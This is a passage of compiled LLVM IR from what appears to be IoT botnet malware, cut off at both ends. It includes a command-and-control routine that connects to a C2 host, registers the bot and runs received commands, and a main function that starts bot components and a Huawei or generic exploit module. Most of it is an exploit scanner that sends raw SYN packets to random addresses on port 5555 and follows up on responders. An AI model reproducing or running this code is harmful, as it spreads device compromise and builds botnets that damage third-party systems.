  %23 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0)) #6
  store i32 %23, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 2, i32 0), align 4
  %24 = load i32, i32* @c2_bot_port, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 zeroext %25) #9
  store i16 %26, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 1), align 2
  %27 = load i32, i32* @C2, align 4
  %28 = call i32 @connect(i32 %27, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16)
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %47

; <label>:30:                                     ; preds = %22
  %31 = load i32, i32* @retry, align 4
  %32 = icmp eq i32 %31, 3
  br i1 %32, label %33, label %37

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @C2, align 4
  %35 = call i32 @close(i32 %34)
  %36 = call i32 @close(i32 0)
  br label %46

; <label>:37:                                     ; preds = %30
  %38 = load i32, i32* @tryagain, align 4
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %45

; <label>:40:                                     ; preds = %37
  %41 = load i32, i32* @C2, align 4
  %42 = call i32 @close(i32 %41)
  %43 = load i32, i32* @retry, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* @retry, align 4
  br label %10

; <label>:45:                                     ; preds = %37
  br label %46

; <label>:46:                                     ; preds = %45, %33
  br label %75

; <label>:47:                                     ; preds = %22
  call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %71, %47
  %49 = load i32, i32* @C2, align 4
  %50 = call i64 @read(i32 %49, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i64 1024)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* @buffer, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %72

; <label>:53:                                     ; preds = %48
  %54 = load i32, i32* @buffer, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %55
  store i8 0, i8* %56, align 1
  %57 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i32 0, i32 0)) #10
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* @C2, align 4
  %61 = call i64 @write(i32 %60, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i64 6)
  br label %62

; <label>:62:                                     ; preds = %59, %53
  %63 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i32 0, i32 0)) #10
  %64 = icmp ne i8* %63, null
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i8*, i8** @trigger, align 8
  %68 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* %67) #10
  %69 = icmp ne i8* %68, null
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %66
  call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0))
  br label %71

; <label>:71:                                     ; preds = %70, %66
  br label %48

; <label>:72:                                     ; preds = %65, %48
  %73 = load i32, i32* @C2, align 4
  %74 = call i32 @close(i32 %73)
  call void @exit(i32 0) #12
  unreachable

; <label>:75:                                     ; preds = %46, %6
  ret void
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  call void @qbot()
  call void @table_init()
  call void @watchdog_maintain()
  %7 = call i32 @rand() #6
  %8 = srem i32 %7, 1
  store i32 %8, i32* %6, align 4
  %9 = load i32, i32* %6, align 4
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %2
  call void (...) bitcast (void ()* @huawei_init to void (...)*)()
  br label %17

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* %6, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  call void (...) bitcast (void ()* @exploit_init to void (...)*)()
  br label %16

; <label>:16:                                     ; preds = %15, %12
  br label %17

; <label>:17:                                     ; preds = %16, %11
  %18 = load i32, i32* %3, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @exploit_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @exploit_scanner_pid, align 4
  %35 = load i32, i32* @exploit_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %0
  %38 = load i32, i32* @exploit_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37, %0
  ret void

; <label>:41:                                     ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* null) #6
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @exploit_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %64

; <label>:50:                                     ; preds = %47
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

; <label>:61:                                     ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %47

; <label>:64:                                     ; preds = %47
  %65 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %65, i32* @exploit_rsck, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %64
  call void @exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* @exploit_rsck, align 4
  %70 = load i32, i32* @exploit_rsck, align 4
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %70, i32 3, i32 0)
  %72 = or i32 2048, %71
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %69, i32 4, i32 %72)
  store i32 1, i32* %1, align 4
  %74 = load i32, i32* @exploit_rsck, align 4
  %75 = bitcast i32* %1 to i8*
  %76 = call i32 @setsockopt(i32 %74, i32 0, i32 3, i8* %75, i32 4) #6
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %81

; <label>:78:                                     ; preds = %68
  %79 = load i32, i32* @exploit_rsck, align 4
  %80 = call i32 @close(i32 %79)
  call void @exit(i32 0) #12
  unreachable

; <label>:81:                                     ; preds = %68
  br label %82

; <label>:82:                                     ; preds = %86, %81
  %83 = call i32 @rand_next()
  %84 = and i32 %83, 65535
  %85 = trunc i32 %84 to i16
  store i16 %85, i16* %2, align 2
  br label %86

; <label>:86:                                     ; preds = %82
  %87 = load i16, i16* %2, align 2
  %88 = call zeroext i16 @ntohs(i16 zeroext %87) #9
  %89 = zext i16 %88 to i32
  %90 = icmp slt i32 %89, 1024
  br i1 %90, label %82, label %91

; <label>:91:                                     ; preds = %86
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i64 1
  %94 = bitcast %struct.iphdr* %93 to %struct.anon.0*
  store %struct.anon.0* %94, %struct.anon.0** %4, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = load i8, i8* %96, align 4
  %98 = and i8 %97, -16
  %99 = or i8 %98, 5
  store i8 %99, i8* %96, align 4
  %100 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %101 = bitcast %struct.iphdr* %100 to i8*
  %102 = load i8, i8* %101, align 4
  %103 = and i8 %102, 15
  %104 = or i8 %103, 64
  store i8 %104, i8* %101, align 4
  %105 = call zeroext i16 @htons(i16 zeroext 40) #9
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 2
  store i16 %105, i16* %107, align 2
  %108 = call i32 @rand_next()
  %109 = trunc i32 %108 to i16
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 3
  store i16 %109, i16* %111, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 5
  store i8 64, i8* %113, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  store i8 6, i8* %115, align 1
  %116 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %117 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %118 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %117, i32 0, i32 1
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %2, align 2
  %120 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %121 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %120, i32 0, i32 0
  store i16 %119, i16* %121, align 4
  %122 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %123 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -241
  %126 = or i16 %125, 80
  store i16 %126, i16* %123, align 4
  %127 = call i32 @rand_next()
  %128 = and i32 %127, 65535
  %129 = trunc i32 %128 to i16
  %130 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 5
  store i16 %129, i16* %131, align 2
  %132 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -513
  %136 = or i16 %135, 512
  store i16 %136, i16* %133, align 4
  br label %137

; <label>:137:                                    ; preds = %718, %91
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %138 = load i32, i32* @exploit_fake_time, align 4
  %139 = load i32, i32* %10, align 4
  %140 = icmp ne i32 %138, %139
  br i1 %140, label %141, label %205

; <label>:141:                                    ; preds = %137
  %142 = load i32, i32* @exploit_fake_time, align 4
  store i32 %142, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %143

; <label>:143:                                    ; preds = %201, %141
  %144 = load i32, i32* %1, align 4
  %145 = icmp slt i32 %144, 160
  br i1 %145, label %146, label %204

; <label>:146:                                    ; preds = %143
  %147 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %147, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i64 1
  %150 = bitcast %struct.iphdr* %149 to %struct.anon.0*
  store %struct.anon.0* %150, %struct.anon.0** %16, align 8
  %151 = call i32 @rand_next()
  %152 = trunc i32 %151 to i16
  %153 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i32, i32* @LOCAL_ADDR, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 8
  store i32 %155, i32* %157, align 4
  %158 = call i32 @get_random_ip()
  %159 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 7
  store i16 0, i16* %162, align 2
  %163 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %164 = bitcast %struct.iphdr* %163 to i16*
  %165 = call zeroext i16 @checksum_generic(i16* %164, i32 20)
  %166 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 7
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %169 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 1
  store i16 %168, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %175 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %174, i32 0, i32 2
  store i32 %173, i32* %175, align 4
  %176 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 6
  store i16 0, i16* %177, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %180 = bitcast %struct.anon.0* %179 to i8*
  %181 = call zeroext i16 @htons(i16 zeroext 20) #9
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %178, i8* %180, i16 zeroext %181, i32 20)
  %183 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %184 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %183, i32 0, i32 6
  store i16 %182, i16* %184, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %188, i32* %190, align 4
  %191 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 1
  %193 = load i16, i16* %192, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = load i32, i32* @exploit_rsck, align 4
  %196 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %197 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %197, %struct.sockaddr** %196, align 8
  %198 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %199 = load %struct.sockaddr*, %struct.sockaddr** %198, align 8
  %200 = call i64 @sendto(i32 %195, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %199, i32 16)
  br label %201

; <label>:201:                                    ; preds = %146
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  br label %143

; <label>:204:                                    ; preds = %143
  br label %205

; <label>:205:                                    ; preds = %204, %137
  store i32 0, i32* %9, align 4
  br label %206

; <label>:206:                                    ; preds = %339, %311, %299, %291, %283, %275, %267, %258, %249, %242, %235, %205
  store i32 0, i32* %18, align 4
  %207 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %208 = bitcast i8* %207 to %struct.iphdr*
  store %struct.iphdr* %208, %struct.iphdr** %20, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.anon.0*
  store %struct.anon.0* %211, %struct.anon.0** %21, align 8
  %212 = call i32* @__errno_location() #9
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* @exploit_rsck, align 4
  %214 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %215 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %215, align 8
  %216 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %217 = load %struct.sockaddr*, %struct.sockaddr** %216, align 8
  %218 = call i64 @recvfrom(i32 %213, i8* %214, i64 1514, i32 16384, %struct.sockaddr* %217, i32* null)
  %219 = trunc i64 %218 to i32
  store i32 %219, i32* %18, align 4
  %220 = load i32, i32* %18, align 4
  %221 = icmp sle i32 %220, 0
  br i1 %221, label %230, label %222

; <label>:222:                                    ; preds = %206
  %223 = call i32* @__errno_location() #9
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 11
  br i1 %225, label %230, label %226

; <label>:226:                                    ; preds = %222
  %227 = call i32* @__errno_location() #9
  %228 = load i32, i32* %227, align 4
  %229 = icmp eq i32 %228, 11
  br i1 %229, label %230, label %231

; <label>:230:                                    ; preds = %226, %222, %206
  br label %351

; <label>:231:                                    ; preds = %226
  %232 = load i32, i32* %18, align 4
  %233 = sext i32 %232 to i64
  %234 = icmp ult i64 %233, 40
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %231
  br label %206

; <label>:236:                                    ; preds = %231
  %237 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* @LOCAL_ADDR, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %243

; <label>:242:                                    ; preds = %236
  br label %206

; <label>:243:                                    ; preds = %236
  %244 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 6
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 6
  br i1 %248, label %249, label %250

; <label>:249:                                    ; preds = %243
  br label %206

; <label>:250:                                    ; preds = %243
  %251 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %252 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %251, i32 0, i32 0
  %253 = load i16, i16* %252, align 4
  %254 = zext i16 %253 to i32
  %255 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %256 = zext i16 %255 to i32
  %257 = icmp ne i32 %254, %256
  br i1 %257, label %258, label %259

; <label>:258:                                    ; preds = %250
  br label %206

; <label>:259:                                    ; preds = %250
  %260 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %261 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = load i16, i16* %2, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp ne i32 %263, %265
  br i1 %266, label %267, label %268

; <label>:267:                                    ; preds = %259
  br label %206

; <label>:268:                                    ; preds = %259
  %269 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = lshr i16 %271, 9
  %273 = and i16 %272, 1
  %274 = icmp ne i16 %273, 0
  br i1 %274, label %276, label %275

; <label>:275:                                    ; preds = %268
  br label %206

; <label>:276:                                    ; preds = %268
  %277 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %278 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = lshr i16 %279, 12
  %281 = and i16 %280, 1
  %282 = icmp ne i16 %281, 0
  br i1 %282, label %284, label %283

; <label>:283:                                    ; preds = %276
  br label %206

; <label>:284:                                    ; preds = %276
  %285 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %286 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 10
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  br i1 %290, label %291, label %292

; <label>:291:                                    ; preds = %284
  br label %206

; <label>:292:                                    ; preds = %284
  %293 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = lshr i16 %295, 8
  %297 = and i16 %296, 1
  %298 = icmp ne i16 %297, 0
  br i1 %298, label %299, label %300

; <label>:299:                                    ; preds = %292
  br label %206

; <label>:300:                                    ; preds = %292
  %301 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %302 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %301, i32 0, i32 3
  %303 = load i32, i32* %302, align 4
  %304 = call i32 @ntohl(i32 %303) #9
  %305 = sub i32 %304, 1
  %306 = call i32 @htonl(i32 %305) #9
  %307 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 8
  %309 = load i32, i32* %308, align 4
  %310 = icmp ne i32 %306, %309
  br i1 %310, label %311, label %312

; <label>:311:                                    ; preds = %300
  br label %206

; <label>:312:                                    ; preds = %300
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %313 = load i32, i32* %9, align 4
  store i32 %313, i32* %18, align 4
  br label %314

; <label>:314:                                    ; preds = %332, %312
  %315 = load i32, i32* %18, align 4
  %316 = icmp slt i32 %315, 128
  br i1 %316, label %317, label %335

; <label>:317:                                    ; preds = %314
  %318 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %318, i64 %320
  %322 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %321, i32 0, i32 2
  %323 = load i32, i32* %322, align 8
  %324 = icmp eq i32 %323, 0
  br i1 %324, label %325, label %331

; <label>:325:                                    ; preds = %317
  %326 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %327 = load i32, i32* %18, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %326, i64 %328
  store %struct.exploit_scanner_connection* %329, %struct.exploit_scanner_connection** %22, align 8
  %330 = load i32, i32* %18, align 4
  store i32 %330, i32* %9, align 4
  br label %335

; <label>:331:                                    ; preds = %317
  br label %332

; <label>:332:                                    ; preds = %331
  %333 = load i32, i32* %18, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %18, align 4
  br label %314

; <label>:335:                                    ; preds = %325, %314
  %336 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %337 = icmp eq %struct.exploit_scanner_connection* %336, null
  br i1 %337, label %338, label %339

; <label>:338:                                    ; preds = %335
  br label %351

; <label>:339:                                    ; preds = %335
  %340 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %343, i32 0, i32 3
  store i32 %342, i32* %344, align 4
  %345 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %346 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %345, i32 0, i32 0
  %347 = load i16, i16* %346, align 4
  %348 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %349 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %348, i32 0, i32 4
  store i16 %347, i16* %349, align 8
  %350 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %350)
  br label %206

; <label>:351:                                    ; preds = %338, %230
  br label %352

; <label>:352:                                    ; preds = %351
  %353 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %354 = getelementptr inbounds [16 x i64], [16 x i64]* %353, i64 0, i64 0
  %355 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %354) #6, !srcloc !1
  %356 = extractvalue { i64, i64* } %355, 0
  %357 = extractvalue { i64, i64* } %355, 1
  %358 = trunc i64 %356 to i32
  store i32 %358, i32* %24, align 4
  %359 = ptrtoint i64* %357 to i64
  %360 = trunc i64 %359 to i32
  store i32 %360, i32* %25, align 4
  br label %361

; <label>:361:                                    ; preds = %352
  br label %362

; <label>:362:                                    ; preds = %361
  %363 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %364 = getelementptr inbounds [16 x i64], [16 x i64]* %363, i64 0, i64 0
  %365 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %364) #6, !srcloc !2
  %366 = extractvalue { i64, i64* } %365, 0
  %367 = extractvalue { i64, i64* } %365, 1
  %368 = trunc i64 %366 to i32
  store i32 %368, i32* %26, align 4
  %369 = ptrtoint i64* %367 to i64
  %370 = trunc i64 %369 to i32
  store i32 %370, i32* %27, align 4
  br label %371

; <label>:371:                                    ; preds = %362
  store i32 0, i32* %1, align 4
  br label %372

; <label>:372:                                    ; preds = %478, %371
  %373 = load i32, i32* %1, align 4
  %374 = icmp slt i32 %373, 128
  br i1 %374, label %375, label %481

; <label>:375:                                    ; preds = %372
  store i32 5, i32* %28, align 4
  %376 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
